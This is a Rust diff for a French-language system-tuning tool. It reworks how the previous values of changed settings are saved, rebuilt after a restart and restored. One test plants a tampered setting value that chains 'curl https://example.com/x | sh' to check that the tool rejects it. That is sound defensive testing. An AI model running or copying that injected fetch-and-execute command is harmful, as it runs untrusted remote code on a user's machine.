@@ -4,6 +4,7 @@
 //! sans note (réglage fait ailleurs), c'est la valeur d'un système neuf qui revient. Aucun réglage n'affaiblit la
 //! sécurité, et ceux qui ne conviennent pas à cette machine (version du système, bureau, matériel) ne sont pas proposés.
 
+pub(crate) mod annulables;
 #[cfg(windows)]
 mod defender;
 mod demarrage;
@@ -14,10 +15,13 @@ mod macos;
 #[cfg(windows)]
 mod windows;
 
+pub(crate) use annulables::Geste;
 pub use demarrage::menu as programmes_au_demarrage;
 pub use demarrage::{
     remettre as remettre_au_demarrage, retirables as demarrage_retirables, retirer as retirer_du_demarrage,
 };
+#[cfg(target_os = "linux")]
+pub(crate) use linux::OLLAMA_VANGUARD;
 
 #[cfg(target_os = "linux")]
 use linux as systeme;
@@ -95,12 +99,24 @@ fn etat(r: &Reglage) -> Etat {
 #[derive(serde::Serialize, serde::Deserialize, Default)]
 struct Historique {
     reglages: BTreeMap<String, Avant>,
+    /// Les notes de Gaming d'avant (jeux.json) ont été reprises : scellé avec les notes, pour que la reprise n'ait
+    /// lieu qu'une fois. Vanguard n'écrit plus jeux.json ; un jeux.json qui revient ensuite vient d'ailleurs, et le
+    /// reprendre le scellerait comme si Vanguard l'avait noté.
+    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
+    jeux_repris: bool,
 }
 
-#[derive(serde::Serialize, serde::Deserialize)]
+#[derive(serde::Serialize, serde::Deserialize, Default, Clone, Debug, PartialEq)]
 struct Avant {
     date: String,
     valeurs: Vec<Valeur>,
+    /// Hors du catalogue (une correction du bilan, un réglage pour jouer) : ce qu'elle fait, montré pour l'annuler.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    titre: Option<String>,
+    /// Hors du catalogue : ce que désigne chaque valeur (`annulables::Geste`), pour rebâtir le réglage après un
+    /// redémarrage. Absent des notes du catalogue, que le code rebâtit seul.
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    gestes: Vec<String>,
 }
 
 fn charger() -> Historique {
@@ -124,11 +140,30 @@ fn mettre_de_cote(chemin: &std::path::Path, genre: &str) -> std::path::PathBuf {
 /// sans que rien ne le signale. Les tests ont chacun leur dossier : l'un réécrirait sinon celui qu'un autre lit
 /// (sous Windows, un fichier ouvert ne se remplace pas).
 fn charger_dans(dossier: &std::path::Path) -> Historique {
+    // Les notes de Gaming d'avant (jeux.json) sont reprises ici, une fois : seulement dans un historique cru, jamais
+    // par-dessus un fichier falsifié ou illisible.
+    // Jamais par-dessus un fichier adopté non plus : l'enregistrement de la reprise le rescellerait, et il perdrait
+    // la marque que le bilan dit (COM-ETA-001).
+    match lire_dans(dossier) {
+        Some((mut h, adopte)) => {
+            if !adopte {
+                annulables::reprendre_jeux(&mut h, dossier);
+            }
+            h
+        }
+        None => Historique::default(),
+    }
+}
+
+/// L'historique tel que lu, et s'il est adopté (accepté tel quel, sans que Vanguard l'ait écrit) ; `None` s'il ne
+/// vaut rien (falsifié, illisible : c'est dit).
+fn lire_dans(dossier: &std::path::Path) -> Option<(Historique, bool)> {
     use crate::sceau::Lecture;
     let chemin = dossier.join(crate::sceau::REGLAGES);
-    let octets = match crate::sceau::lire_dans(dossier, crate::sceau::REGLAGES) {
-        Lecture::Absent => return Historique::default(),
-        Lecture::Intact(o) | Lecture::Adopte(o) => o,
+    let (octets, adopte) = match crate::sceau::lire_dans(dossier, crate::sceau::REGLAGES) {
+        Lecture::Absent => return Some((Historique::default(), false)),
+        Lecture::Intact(o) => (o, false),
+        Lecture::Adopte(o) => (o, true),
         Lecture::Falsifie(_) => {
             let copie = mettre_de_cote(&chemin, "falsifie");
             tre!(
@@ -136,19 +171,19 @@ fn charger_dans(dossier: &std::path::Path) -> Historique {
                 "Warning: previous setting values changed outside Vanguard: none is restored. Copy kept: {}",
                 copie.display()
             );
-            return Historique::default();
+            return None;
         }
         Lecture::Illisible(e) => {
             tre!(
                 "Attention : valeurs d'avant des réglages illisibles ({e}).",
                 "Warning: previous setting values unreadable ({e})."
             );
-            return Historique::default();
+            return None;
         }
     };
     let texte = String::from_utf8_lossy(&octets);
     match serde_json::from_str::<Historique>(texte.trim_start_matches('\u{feff}')) {
-        Ok(h) => h,
+        Ok(h) => Some((h, adopte)),
         Err(e) => {
             // Jamais écraser des valeurs d'avant qu'on ne sait pas relire : le fichier est mis de côté, intact.
             let copie = mettre_de_cote(&chemin, "illisible");
@@ -157,17 +192,13 @@ fn charger_dans(dossier: &std::path::Path) -> Historique {
                 "Warning: previous setting values unreadable ({e}). Copy kept: {}",
                 copie.display()
             );
-            Historique::default()
+            None
         }
     }
 }
 
 /// Écrit l'historique d'un bloc, scellé (fichier temporaire, puis renommé) : une coupure ou un Ctrl-C laissent
 /// l'ancien ou le nouveau, jamais un fichier tronqué qui, relu vide, ferait perdre toutes les valeurs d'avant.
-fn sauver(h: &Historique) -> bool {
-    sauver_dans(h, &crate::reseau::dossier_local())
-}
-
 fn sauver_dans(h: &Historique, dossier: &std::path::Path) -> bool {
     let ecrit = serde_json::to_string_pretty(h)
         .map_err(std::io::Error::other)
@@ -247,16 +278,31 @@ fn valeurs_d_avant(r: &Reglage, h: &Historique) -> Vec<Valeur> {
 }
 
 /// Les valeurs à remettre pour annuler `r` sont-elles relues en place ?
-fn remis_en_place(r: &Reglage, h: &Historique) -> bool {
+fn remis_en_place(r: &Reglage, h: &Historique, couverts: &[&str]) -> bool {
+    let gestes = h.reglages.get(r.id.as_ref()).map_or(&[][..], |a| a.gestes.as_slice());
     r.changements
         .iter()
         .zip(valeurs_d_avant(r, h))
-        .all(|(c, v)| c.lire() == v)
+        .enumerate()
+        .all(|(j, (c, v))| c.lire() == v || gestes.get(j).is_some_and(|g| couverts.contains(&g.as_str())))
 }
 
 /// Applique et annule, d'un seul passage (un point de restauration, une demande administrateur), puis met
 /// l'historique à jour. Retourne la réussite de chaque réglage appliqué, puis de chaque réglage annulé.
 fn executer(a_faire: &[&Reglage], a_annuler: &[&Reglage], h: &mut Historique) -> (Vec<bool>, Vec<bool>) {
+    let (faits, annules, _) = executer_avec(a_faire, a_annuler, h, &[], &crate::reseau::dossier_local());
+    (faits, annules)
+}
+
+/// Comme `executer`, avec `en_plus` : les commandes d'autres annulations (un blocage), lancées dans la même demande
+/// administrateur, pour que « Tout remettre comme avant » n'en ouvre qu'une. Rend aussi la réussite de chacune.
+fn executer_avec(
+    a_faire: &[&Reglage],
+    a_annuler: &[&Reglage],
+    h: &mut Historique,
+    en_plus: &[Vec<String>],
+    dossier: &std::path::Path,
+) -> (Vec<bool>, Vec<bool>, Vec<bool>) {
     let date = chrono::Local::now().format("%Y-%m-%d %H:%M").to_string();
     // Valeurs d'avant notées avant de toucher à quoi que ce soit : la plus ancienne reste, pour revenir à l'état
     // d'origine même après plusieurs passages.
@@ -268,11 +314,16 @@ fn executer(a_faire: &[&Reglage], a_annuler: &[&Reglage], h: &mut Historique) ->
         h.reglages.entry(r.id.to_string()).or_insert_with(|| Avant {
             date: date.clone(),
             valeurs: r.changements.iter().map(systeme::Changement::lire).collect(),
+            ..Avant::default()
         });
     }
     // Sans valeurs d'avant notées, un réglage ne pourrait plus s'annuler exactement : rien n'est changé.
-    if !a_faire.is_empty() && !sauver(h) {
-        return (vec![false; a_faire.len()], vec![false; a_annuler.len()]);
+    if !a_faire.is_empty() && !sauver_dans(h, dossier) {
+        return (
+            vec![false; a_faire.len()],
+            vec![false; a_annuler.len()],
+            vec![false; en_plus.len()],
+        );
     }
     let mut groupes: Vec<Vec<(&systeme::Changement, Valeur)>> = a_faire
         .iter()
@@ -281,7 +332,7 @@ fn executer(a_faire: &[&Reglage], a_annuler: &[&Reglage], h: &mut Historique) ->
     for r in a_annuler {
         groupes.push(r.changements.iter().zip(valeurs_d_avant(r, h)).collect());
     }
-    let resultats = systeme::ecrire(&groupes);
+    let (resultats, plus) = systeme::ecrire_avec(&groupes, en_plus);
     let (faits, annules) = resultats.split_at(a_faire.len().min(resultats.len()));
     // Échec sans aucun changement : la note n'a pas lieu d'être (en partie fait, elle reste pour pouvoir annuler).
     for (r, ok) in a_faire.iter().zip(faits) {
@@ -291,16 +342,29 @@ fn executer(a_faire: &[&Reglage], a_annuler: &[&Reglage], h: &mut Historique) ->
     }
     // Annulé = les valeurs d'avant relues en place, pas seulement des commandes sans erreur : une valeur qu'aucune
     // commande ne sait remettre laisse la note, pour pouvoir réessayer.
-    let remis: Vec<bool> = a_annuler
-        .iter()
-        .zip(annules)
-        .map(|(r, ok)| *ok && remis_en_place(r, h))
-        .collect();
+    // Deux notes sur la même cible, défaites ensemble de la plus récente à la plus ancienne : la plus ancienne écrit
+    // en dernier l'état d'avant les deux. La plus récente ne relit donc pas le sien (l'état d'entre les deux), et
+    // c'est voulu ; une valeur couverte par une note plus ancienne relue en place compte comme remise. Sinon sa note
+    // restait, avec un faux ✖, et la réessayer ramenait l'état d'entre les deux.
+    let mut remis = vec![false; a_annuler.len()];
+    let mut couverts: Vec<&str> = Vec::new();
+    for i in (0..a_annuler.len()).rev() {
+        let r = a_annuler[i];
+        remis[i] = annules.get(i) == Some(&true) && remis_en_place(r, h, &couverts);
+        if remis[i] {
+            couverts.extend(
+                h.reglages
+                    .get(r.id.as_ref())
+                    .into_iter()
+                    .flat_map(|a| a.gestes.iter().map(String::as_str)),
+            );
+        }
+    }
     for (r, _) in a_annuler.iter().zip(&remis).filter(|(_, remis)| **remis) {
         h.reglages.remove(r.id.as_ref());
     }
-    sauver(h);
-    (faits.to_vec(), remis)
+    sauver_dans(h, dossier);
+    (faits.to_vec(), remis, plus)
 }
 
 fn libelle(e: Etat, par_vanguard: bool) -> &'static str {
@@ -566,7 +630,16 @@ fn hors_catalogue(h: &Historique) -> Vec<Reglage> {
         .into_iter()
         .collect();
     l.extend(demarrage::notes(h));
+    l.extend(annulables::rebatis(h));
     l
+}
+
+/// Les réglages du catalogue qui ont une note.
+fn catalogue_note(h: &Historique) -> Vec<Reglage> {
+    systeme::catalogue()
+        .into_iter()
+        .filter(|r| h.reglages.contains_key(r.id.as_ref()))
+        .collect()
 }
 
 /// Le DNS changé par Vanguard, s'il l'a fait : (date du changement, réseau concerné : connexion, carte ou service).
@@ -648,14 +721,6 @@ fn dire_dns_tenu() {
     );
 }
 
-/// Les réglages hors catalogue à remettre : sans le DNS quand le mode Wi-Fi public le tient.
-fn hors_catalogue_a_remettre(h: &Historique, tient_le_dns: bool) -> Vec<Reglage> {
-    hors_catalogue(h)
-        .into_iter()
-        .filter(|r| !(tient_le_dns && r.id.as_ref() == DNS))
-        .collect()
-}
-
 /// Remet le DNS d'avant le changement de Vanguard, après accord.
 pub fn remettre_dns() {
     if crate::reseau::wifi_public::tient_le_dns() {
@@ -664,43 +729,25 @@ pub fn remettre_dns() {
     }
     let h = charger();
     let reglages = hors_catalogue(&h);
-    if let Some(r) = reglages.first() {
+    if let Some(r) = reglages.iter().find(|r| r.id.as_ref() == DNS) {
         confirmer_et_executer(&[], &[r]);
     }
 }
 
-/// Le nombre de réglages changés par Vanguard dont la valeur d'avant est notée (ce que « Tout remettre comme avant »
-/// défait).
+/// Le nombre de réglages d'Optimiser changés par Vanguard dont la valeur d'avant est notée (les corrections du bilan
+/// et les réglages pour jouer, notés au même endroit, se comptent à part).
 pub(crate) fn reglages_notes() -> usize {
-    charger().reglages.len()
+    charger()
+        .reglages
+        .keys()
+        .filter(|id| !id.starts_with(annulables::BILAN) && !id.starts_with(annulables::JEUX))
+        .count()
 }
 
-/// Annule tout ce que Vanguard a changé : les valeurs notées avant chaque changement reviennent.
+/// Annule tout ce que Vanguard a changé : `annulation::tout_remettre`, qui défait aussi le bilan, Gaming, les
+/// blocages et le mode Wi-Fi public.
 pub fn tout_annuler() {
-    titre(tr!("Tout remettre comme avant", "Put everything back"));
-    crate::reseau::wifi_public::proposer_d_eteindre();
-    let h = charger();
-    let tient = crate::reseau::wifi_public::tient_le_dns() && h.reglages.contains_key(DNS);
-    if tient {
-        dire_dns_tenu();
-    }
-    let mut reglages = systeme::catalogue();
-    reglages.extend(hors_catalogue_a_remettre(&h, tient));
-    let a_annuler: Vec<&Reglage> = reglages
-        .iter()
-        .filter(|r| h.reglages.contains_key(r.id.as_ref()))
-        .collect();
-    if a_annuler.is_empty() {
-        if tient {
-            return;
-        }
-        trp!(
-            "  {GRIS}Vanguard n'a changé aucun réglage sur cette machine.{RESET}",
-            "  {GRIS}Vanguard has not changed any setting on this machine.{RESET}"
-        );
-        return;
-    }
-    confirmer_et_executer(&[], &a_annuler);
+    crate::annulation::tout_remettre();
 }
 
 #[cfg(test)]
@@ -797,9 +844,10 @@ mod tests {
     }
 
     /// Le mode Wi-Fi public tient le DNS : « Tout remettre » le laisse (le mode reposerait sinon, en s'éteignant, la
-    /// valeur d'ici, et la note d'origine serait perdue) ; le reste est remis comme avant.
+    /// valeur d'ici, et la note d'origine serait perdue) ; la note reste, rien n'est lancé.
     #[test]
     fn dns_laisse_quand_le_mode_le_tient() {
+        let dossier = dossier_jetable("dns-tenu");
         let mut h = Historique::default();
         #[cfg(target_os = "linux")]
         let note = "0b8c2f4e-1a2b-4c3d-9e8f-001122334455\n|no||no";
@@ -812,15 +860,18 @@ mod tests {
             Avant {
                 date: String::new(),
                 valeurs: vec![Some(note.into())],
+                ..Avant::default()
             },
         );
-        let avec = |tient| {
-            hors_catalogue_a_remettre(&h, tient)
-                .iter()
-                .any(|r| r.id.as_ref() == DNS)
-        };
-        assert!(avec(false), "sans le mode, le DNS noté se remet");
-        assert!(!avec(true), "le mode tient le DNS : il est laissé");
+        assert!(sauver_dans(&h, &dossier));
+        assert!(hors_catalogue(&h).iter().any(|r| r.id.as_ref() == DNS));
+        let (issues, _) = annulables::defaire_dans(&[DNS.to_string()], &[], true, &dossier);
+        assert!(matches!(issues[0].1, annulables::Issue::Refuse(_)), "{issues:?}");
+        assert!(
+            charger_dans(&dossier).reglages.contains_key(DNS),
+            "la note du DNS reste"
+        );
+        let _ = std::fs::remove_dir_all(&dossier);
     }
 
     #[test]
@@ -831,6 +882,7 @@ mod tests {
             Avant {
                 date: "2026-10-17 21:00".into(),
                 valeurs: vec![Some("dword:1".into()), None],
+                ..Avant::default()
             },
         );
         let relu: Historique = serde_json::from_str(&serde_json::to_string(&h).unwrap()).unwrap();
@@ -862,6 +914,7 @@ mod tests {
             Avant {
                 date: "2026-10-18 01:00".into(),
                 valeurs: vec![Some("1".into())],
+                ..Avant::default()
             },
         );
         assert!(sauver_dans(&h, &dossier));
@@ -892,6 +945,7 @@ mod tests {
             Avant {
                 date: "2026-10-18 01:00".into(),
                 valeurs: vec![Some("x".into())],
+                ..Avant::default()
             },
         );
         assert!(sauver_dans(&h, &dossier));
@@ -955,6 +1009,7 @@ mod tests {
             Avant {
                 date: String::new(),
                 valeurs: vec![Some("1; curl https://example.com/x | sh".into())],
+                ..Avant::default()
             },
         );
         assert!(note_admise(r, &h).is_none());
@@ -997,15 +1052,19 @@ mod tests {
             Avant {
                 date: String::new(),
                 valeurs: vec![None],
+                ..Avant::default()
             },
         );
-        assert!(!remis_en_place(&r, &h), "la ligne posée par Vanguard est encore là");
+        assert!(
+            !remis_en_place(&r, &h, &[]),
+            "la ligne posée par Vanguard est encore là"
+        );
         std::fs::write(&f, "# ligne retirée\n").unwrap();
-        assert!(remis_en_place(&r, &h));
+        assert!(remis_en_place(&r, &h, &[]));
         // Sans note, c'est la valeur d'un système neuf qui doit revenir.
-        assert!(!remis_en_place(&r, &Historique::default()));
+        assert!(!remis_en_place(&r, &Historique::default(), &[]));
         std::fs::write(&f, "ENABLED=1\n").unwrap();
-        assert!(remis_en_place(&r, &Historique::default()));
+        assert!(remis_en_place(&r, &Historique::default(), &[]));
         let _ = std::fs::remove_file(&f);
     }
 }
